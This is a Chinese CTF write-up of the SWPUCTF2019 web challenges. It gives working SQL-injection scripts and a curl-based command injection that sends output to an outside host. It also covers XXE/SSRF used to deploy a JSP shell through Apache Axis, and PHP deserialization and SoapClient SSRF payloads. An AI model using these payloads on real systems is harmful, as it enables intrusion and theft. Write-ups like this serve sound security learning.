---
title: SWPUCTF2019--web全wp
date: 2020-01-01 20:35:01
tags: writeup
---

**目录**
<!-- toc -->

## 前言

这次的比赛我们队伍（mini-venom）全AK，也是连清人第一次的全AK，当然web是第二次AK了，上次是不久前的南邮CTF,理所当然的拿下了第一。之前的南邮比赛WEB也全AK了，不过那个稍微简单点。这次SWPUCTF难度稍大，还有一题java，并且每道题都有我的参与，纪念意义稍大，不得不吹下表哥们，猛的不行。我们很多思路都在wp上交流，所以基本上可以看到一步一步的思路。

## easy_web 

title的二次注入，在title处输入1' 可以看到报错

![](https://wulasite.top/mdimage/swpuctf2019/1.png)

初步fuzz了一下空格会被替换成空，所以可以用/**/，注释符、and、or、报错注入的函数都被禁止了不知道要找啥

0'/**/||/**/ascii(substr((select/**/pass/**/from/**/users/**/where/**/name='admin'),2,1))/**/>/**/52/**/||/**/'0不想写脚本。。。慢慢dump把admin 密码md5 53e217ad4c721eb9565cf25a5ec3b66e 没啥用 flag在数据库里咋找 还有一个id为1的flag用户 密码MD5是 f8ae51b4f44b623f665539af7d2b83f9  这个也爆破不出来

<!-- more -->

```python
#coding=utf-8
import requests as rq
import sys
import re

reload(sys)
sys.setdefaultencoding("utf8")

url='http://211.159.177.185:23456/addads.php'
url1='http://211.159.177.185:23456/empty.php'
url2='http://211.159.177.185:23456'
flag=""
cookies={'PHPSESSID':'53g3panpbnfcs8cmujt65m9cpc'}
headers={
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0'
}
for a in range(1,150):
    b=0
    for i in range(32,127):
        # post="0'/**/||/**/ascii(substr((select/**/pass/**/from/**/users/**/where/**/name='admin'),"+str(a)+",1))/**/=/**/"+str(i)+"/**/||/**/'0"
        # post="0'/**/||/**/ascii(substr((select/**/version()),"+str(a)+",1))/**/=/**/"+str(i)+"/**/||/**/'0"
        # post="0'/**/||/**/ascii(substr((select/**/database()),"+str(a)+",1))/**/=/**/"+str(i)+"/**/||/**/'0"
        post="0'/**/||/**/ascii(substr((select/**/group_concat(pass)/**/from/**/users/**/where/**/name='flag'),"+str(a)+",1))/**/=/**/"+str(i)+"/**/||/**/'0"
        data={'title':post,'content':"aaa",'ac':'add'}
        ”res=rq.post(url,headers=headers,data=data,cookies=cookies)
        # print res.text
        # exit()
        # print post
        abc=rq.get(url2,headers=headers,cookies=cookies)
        s=re.findall(r'<a href=\'detail\.php\?id=(\d+)\'>',abc.text)
        url3=url2+"/detail.php?id="+s[0]
        abex=rq.get(url3,headers=headers,cookies=cookies)
        # print abex.text
        if "wdnmd" in abex.text:
            flag+=chr(i)
            print flag
            b=1
        aaa=rq.get(url1,headers=headers,cookies=cookies)
        if b==1:
            break
        if i==126:
            print flag
            exit()
print flag
```

还有一个id为1的flag用户 密码MD5是 f8ae51b4f44b623f665539af7d2b83f9,解密就是flag。。。。

这种出题人。。。

虽然这题这样也可以做出来，是因为我通过国赛的那个payload报错注入出了user和pass的列名，并且前提知道是user表。如果不是user表呢？就需要用到**官方的解题思路**了。

首先是要想着**爆列数搞union select**，因为二次注入有回显。

滤了空格，可以使用/**/绕过
过滤了报错注入的函数，不方便使用时间盲注，有回显，可以直接使用联合注入

过滤了or，不能使用order by判断字段数和查询information_schema这个库

因此判断表的时候使用**group by** ，同时由于过滤了注释符，又需要闭合单引号，使用group by 1,‘1’

>  GROUP BY 语句用于结合聚合函数，根据一个或多个列对结果集进行分组。

```
# 判断有多少字段
-1'/**/group/**/by/**/22,'1
# union 查询
-1'union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22
```

```
后面过滤了information_schema和mysql，使用database()或者schema()代表当前数据库名，在 sys 数据库中查找当前数据库的表名
```

具体可参考： [聊一聊bypass information_schema](https://www.anquanke.com/post/id/193512)

## python简单题

随便输入账号密码进去看到提示 Red*s

提示的应该是 Redis, 大概思路是 flask session 存放在 redis 里 

去年的 rwctf 好像有这么个题谁有空可以看看这个思路, 但是得知道源码里是不是有lua注入

https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html 

https://xz.aliyun.com/t/219

扫了下服务器的端口，发现服务器开了 6379

爆破一下密码就是默认密码password

在里面可以看到一堆session字符串键值，用GET命令看下内容发现是序列化后的东西，那么就直接上反序列化的就可以了。注意是python2和linux

![](https://wulasite.top/mdimage/swpuctf2019/2.png)

然后在redis修改对应自己登陆的session里的值,然后再访问一次就可以触发反序列了

![](https://wulasite.top/mdimage/swpuctf2019/3.png)



![](https://wulasite.top/mdimage/swpuctf2019/4.png)

![](https://wulasite.top/mdimage/swpuctf2019/6.png)

## easy_python 

这题思路比较简单。登录上去查看session里的内容发现id=100,这种情况一般就是要改session，所以就去找secret_key，最后在404的返回头里找打了，所以说burp还是挺关键的。

SECRET_KEY:keyqqqwwweee!@#$%^&*用flask session cookie manager解密和重加密一下，修改id为1

![](https://wulasite.top/mdimage/swpuctf2019/7.png)

得到

.eJyrVspMUbKqVlJIUrJS8g20tVWq1VHKLI7PyU_PzFOyKikqTdVRKkgsLi7PLwIqVEpMyQWK6yiVFqcW5SXmpsKFagFiyxgX.XekyGw.wYomzVd7LK9ea7WN-mZaQ0gldjg

然后点击上传页面在注释里找到源码。

这题就是上传然后拼接unzip命令，其实从这里大家都会想命令执行，但是还有个更简单的办法就是软链接。不过zip命令打包软链接要加参数-y才可以保持软链接。这里比较基础及不展示了。接下来讲下大师傅的执行命令的思路。

大家都知道在命令行中有些特殊的表示方法会被解释成命令，比如

```bash
``
$()
or more
```

所以利用这些就可以执行命令，比如这个payload

```bash
$(curl xxx.xxx.xxx.xxx:9999?/`pwd`).zip
```

就可以带出pwd，所以在这种情况下我们就可以执行命令了。但是这如果文件名带/就会报错。所以我们得想办法造一个。

比如用awk，没探究过其它的，但是Linux肯定在编码上也有很多种方法，所以肯定不止这种方法。

```
awk 'BEGIN{printf "%c", 47}
```



## emo_mvc 

这题也比较简单，没什么难点。就是懒得写脚本，给了个时盲注的payload就开溜，最后还是队友写的脚本，但是队友写的脚本又有问题，哭了，后面拿这个问别人才知道大小写问题。下面给出的脚本是我修改过的能跑出正确的。

是个注入 但是很奇怪 fuzz一下规律
似乎waf也会变成username or password error 
比如{"username":"1'","password":"admin'"}和{"username":"1'set","password":"admin'"}是500
但是
{"username":"1'select","password":"admin'"}
就会变成error username or password

睡醒了  给了PDO的提示 看看PDO query的注入
{"username":"1';SET @a=0x73656C65637420736C6565702835293B;PREPARE st FROM @a;EXECUTE st;","password":"admin'"}

```python
#coding=utf-8
import re
import requests
import sys
import binascii
import json

reload(sys)
sys.setdefaultencoding("utf8")
url="http://182.92.220.157:11116/index.php?r=Login/Login"

flag=""
def str_to_hex(s):
    return ''.join([hex(ord(c)).replace('0x', '') for c in s])

for i in range(1,40):
    print(i)
    for str1 in "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_,!@#$%^&*``.":
        sql = "select if((ascii(substr((select group_concat(flag) from flag),"+str(i)+",1))='"+str(ord(str1))+"'),sleep(5),2);"   # ctf
        sql_hex = str_to_hex(sql)
        data={
            "username":"1\';SET @a=0x"+str(sql_hex)+";PREPARE st FROM @a;EXECUTE st;",
            "password":"admin\'"
        }   
        try:
            result=requests.post(url,json=data,timeout=4)
            # print result.text
        except requests.exceptions.ReadTimeout:
            flag+=str1
            print(flag)
            break
print(flag)
```

我爆出来的是amol#t.zip  感觉是延时注入的问题  我这个网不太好的样子。。。

flag的内容应该就是amol#t.zip
上面脚本有问题 substr之后的判断是不分大小写的，加了个ascii，最终是AmOL#T.zip，访问可得源码
 http://182.92.220.157:11116/AmOL%23T.zip 
审计半天，以为是个大老虎，结果就是一个文件读取。。
http://182.92.220.157:11116/index.php?r=User/Index&img_file=/../flag.php
会把img_file的内容读出来并base64,还以为这个img_info会检查。。。

![](https://wulasite.top/mdimage/swpuctf2019/8.png)

![](https://wulasite.top/mdimage/swpuctf2019/9.png)

## FFFFF 

通过这题明显感觉到自己和师傅们的搜索能力的差距。

XXE via Excel: https://xz.aliyun.com/t/3741大概是需要找一个能用的 payload 吧@HPdoger oob收到请求了先测试一下xxe

![](https://wulasite.top/mdimage/swpuctf2019/10.png)

然后用netdoc打文件夹可以得到备份文件，然后打开发现catalina.policy控制了权限，所以这个ctffffff服务打不了flag。所以思路就顺其自然的就打axis。去搜文章可以看到有cve

[http://www.lmxspace.com/2019/07/20/Axis-Rce%E5%88%86%E6%9E%90/](http://www.lmxspace.com/2019/07/20/Axis-Rce分析/)

先打adminservice创建一个RandomService ，并设置路径。同时限制了ip，所以需要xxe去打adminservice。

ssrf参考https://www.freebuf.com/vuls/135318.html 将post转成get请求的

所以就是

```xml
?xml version="1.0" encoding="UTF-8"?>


<!DOCTYPE x [ <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/axis/services/AdminService?method=!--%3E%3Cns1%3Adeployment+xmlns%3Ans1%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22+xmlns%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22+xmlns%3Ajava%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2Fproviders%2Fjava%22%3E%3Cns1%3Aservice+name%3D%22RandomService%22+provider%3D%22java%3ARPC%22%3E+%3CrequestFlow%3E+%3Chandler+type%3D%22RandomLog%22%2F%3E+%3C%2FrequestFlow%3E+%3Cns1%3Aparameter+name%3D%22className%22+value%3D%22java.util.Random%22%2F%3E+%3Cns1%3Aparameter+name%3D%22allowedMethods%22+value%3D%22*%22%2F%3E+%3C%2Fns1%3Aservice%3E+%3Chandler+name%3D%22RandomLog%22+type%3D%22java%3Aorg.apache.axis.handlers.LogHandler%22%3E+%3Cparameter+name%3D%22LogHandler.fileName%22+value%3D%22..%2Fwebapps%2Faxis%2Fshell.jsp%22%2F%3E+%3Cparameter+name%3D%22LogHandler.writeToConsole%22+value%3D%22false%22%2F%3E+%3C%2Fhandler%3E+%3C%2Fns1%3Adeployment"> ]>
<x>&xxe;</x>
```

上传就可以创建service了

![](https://wulasite.top/mdimage/swpuctf2019/11.png)

然后写入shell

![](https://wulasite.top/mdimage/swpuctf2019/12.png)

获取flag

![](https://wulasite.top/mdimage/swpuctf2019/13.png)



## 出题人不知道

这题蛮有水平，但是出题人似乎是因为出题太晚而导致我们直接读到service.php，弄了个非预期解。非预期没啥，讲下预期。

被过滤的：like    sleep    regexp    select    limit    benchmark    and    where    (    )    union

username=1\&passwd=||passwd > "1";#

username=1\&passwd=||passwd < "1";#

这里太妙了，巧妙了利用字符串比较的技巧。出题人给的payload是

```php
usernam=1’ or ‘1’=‘1’  group by passwd with rollup having passwd is NULL – -&passwd=
```

但是说实话这个局限性比较大，因为一般都会判断密码是否为空，真好在一次无聊的渗透遇到了密码不为空的情况。

爆出

账号xiaoc 密码 333333333xiaoa 密码 111111111xiaob 密码 222222222

hint内容：a few file may be helpful index.php  Service.php interface.php se.php

get_flag：

method can use get_flag only **admin in 127.0.0.1** can get_flag

重点在于se.php和interface.php

虽然se.php搞得很夸张

```php
<?php


ini_set('session.serialize_handler', 'php');

class aa
{
        public $mod1;
        public $mod2;
        public function __call($name,$param)
        {
            if($this->{$name})
                {
                    $s1 = $this->{$name};
                    $s1();
                }
        }
        public function __get($ke)
        {
            return $this->mod2[$ke];
        }
}

class bb
{
        public $mod1;
        public $mod2;
        public function __destruct()
        {
            $this->mod1->test2();
        }
}
class cc
{
        public $mod1;
        public $mod2;
        public $mod3;
        public function __invoke()
        {
                $this->mod2 = $this->mod3.$this->mod1;
        }
}
class dd
{
        public $name;
        public $flag;
        public $b;
        
        public function getflag()
        {
                session_start();
                var_dump($_SESSION);
                $a = array(reset($_SESSION),$this->flag);
                echo call_user_func($this->b,$a);
        }
}
class ee
{
        public $str1;
        public $str2;
        public function __toString()
        {
                $this->str1->{$this->str2}();
                return "1";
        }
}




$a = $_POST['aa'];
unserialize($a);
?>
```

但是耐心搞一会还是可以弄出POP链的，同时还可以读cookie解密php，逆一下就可以得到加密算法伪造admin

POP链就是最后到getflag那里改的原题[https://wywwzjj.top/2019/08/20/%E5%BD%93PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%81%87%E4%B8%8ASSRF/#2018-LCTF-babyphp%E2%80%99s-revenge](https://wywwzjj.top/2019/08/20/当PHP反序列化遇上SSRF/#2018-LCTF-babyphp's-revenge)但是没有session设置的方法，所以找到个方法，设置session，可以利用upload_progress来设置session，但是这样设置了在reset($_SESSION)并不能返回soapclient的对象，所以暂时没利用成功。先说下getflag的触发思路吧

```php
$a = new aa();
$b = new bb();
$c = new cc();
$d = new dd();
$e = new ee();


// 7. 调用call_user_func(reset($_SESSION), $d->flag) 如果reset($_SESSION)是个soapclient就会触发ssrf 差这一步 需要靠upload_progress 但是并不成功
$d->b = 'call_user_func';
$d->flag = 'Get_flag';


// 6. __to_strging中会调用 $this->str1->{$this->str2}(); 就是dd::getflag()
$e->str1 = $d;
$e->str2 = 'getflag';

//从下往上看
// 5. 在invoke中调用字符串中拼接时，因为都是对象，所以都会触发该对象的__get
$c->mod3 = $e;
$c->mod1 = $e;


// 2. 当触发__call后，里面的$name会等于test2,然后$this->test2这个属性并不存在，所以会调用__get
// 3. 触发__get时，里面的$ke就会等于test2,所以是返回$this->mod2['test2']，这时候我们让$this->mod2等于一个数组，并把其test2的值设为cc的对象
// 4. 从__get里返回之后$s1 = cc的对象,当调用$s1()就会触发invoke 
$a->mod2 = array('test2'=> $c);


// 1. 这步在反序列化的时候会调用aa::test2(),但是aa::test2()不存在，所以会触发__call 
// __destruct->__call->__get->__get->__invoke->__toString->getflag

$b->mod1 = $a;


$x = serialize($b);
// $a = $_POST['aa'];
unserialize($x);

// 还差把序列化后的soapclient放到session第一位就可以触发ssrf了
// 预期解的
$target = "http://127.0.0.1/index.php?method=get_flag";
$options = array(
    "location" => $target,
    "user_agent" => "test",
    "uri" => "demo",
    "trace" => 1,
    "stream_context" => 0
);
 $a = new SoapClient(null,$options);
 $a->__setCookie('user', 'xZmdm9NxaQ==');
 var_dump(serialize($a));
```

所以可以提交payload，但是打不出来 看了下源码，是可以打到的，但是没回显，本地测试确实打进了。直接打interface的service。原理就是soapclient和soapserver交互可以有回显。放到第二个payload了

```html
POST /se.php HTTP/1.1
Host: 132.232.75.90
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Referer: http://localhost/wulalala.html
Content-Type: multipart/form-data; boundary=---------------------------18467633426500
Content-Length: 878
Connection: close
Cookie: PHPSESSID=1c3jq2kqat2d123kv2rl6; user=xZmdm9NxaQ==
Upgrade-Insecure-Requests: 1

-----------------------------18467633426500
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

baaabb|O:10:"SoapClient":6:{s:3:"uri";s:30:"http://127.0.0.1/interface.php";s:8:"location";s:30:"http://127.0.0.1/interface.php";s:5:"trace";i:1;s:15:"_stream_context";i:0;s:13:"_soap_version";i:1;s:8:"_cookies";a:1:{s:4:"user";a:1:{i:0;s:12:"xZmdm9NxaQ==";}}}
-----------------------------18467633426500
Content-Disposition: form-data; name="file"; filename='aaaaaa'
Content-Type: application/octet-stream

1
-----------------------------18467633426500
Content-Disposition: form-data; name="aa"

O:2:"bb":2:{s:4:"mod1";O:2:"aa":2:{s:4:"mod1";N;s:4:"mod2";a:1:{s:5:"test2";O:2:"cc":3:{s:4:"mod1";O:2:"ee":2:{s:4:"str1";O:2:"dd":3:{s:4:"name";N;s:4:"flag";s:3:"123";s:1:"b";s:14:"call_user_func";}s:4:"str2";s:7:"getflag";}s:4:"mod2";N;s:4:"mod3";r:6;}}}s:4:"mod2";N;}
-----------------------------18467633426500--
```

```php
POST /se.php HTTP/1.1
Host: 132.232.75.90
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Referer: http://localhost/wulalala.html
Content-Type: multipart/form-data; boundary=---------------------------18467633426500
Content-Length: 943
Connection: close
Cookie: PHPSESSID=1c3jq2kqat2d123kv2rl6; user=xZmdm9NxaQ==
Upgrade-Insecure-Requests: 1


-----------------------------18467633426500
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"


baaabb|O:10:"SoapClient":6:{s:3:"uri";s:30:"http://127.0.0.1/interface.php";s:8:"location";s:30:"http://127.0.0.1/interface.php";s:5:"trace";i:1;s:15:"_stream_context";i:0;s:13:"_soap_version";i:1;s:8:"_cookies";a:1:{s:4:"user";a:1:{i:0;s:12:"xZmdm9NxaQ==";}}}
-----------------------------18467633426500
Content-Disposition: form-data; name="file"; filename='aaaaaa'
Content-Type: application/octet-stream


1
-----------------------------18467633426500
Content-Disposition: form-data; name="aa"

O:2:"bb":2:{s:4:"mod1";O:2:"aa":2:{s:4:"mod1";N;s:4:"mod2";a:1:{s:5:"test2";O:2:"cc":3:{s:4:"mod1";O:2:"ee":2:{s:4:"str1";O:2:"dd":3:{s:4:"name";N;s:4:"flag";s:8:"get_flag";s:1:"b";s:14:"call_user_func";}s:4:"str2";s:7:"getflag";}s:4:"mod2";N;s:4:"mod3";r:6;}}}s:4:"mod2";N;}
-----------------------------18467633426500--
```

![](https://wulasite.top/mdimage/swpuctf2019/14.png)

## 总结

这次比赛又是爆肝的比赛，周末只睡了4、5个小时，不过有所回报，已经是很好的情况了。这次虽然做的很好，但是还是在速度和搜索能力上有所欠缺，自己还有很多短处，需要补足。

<!--  -->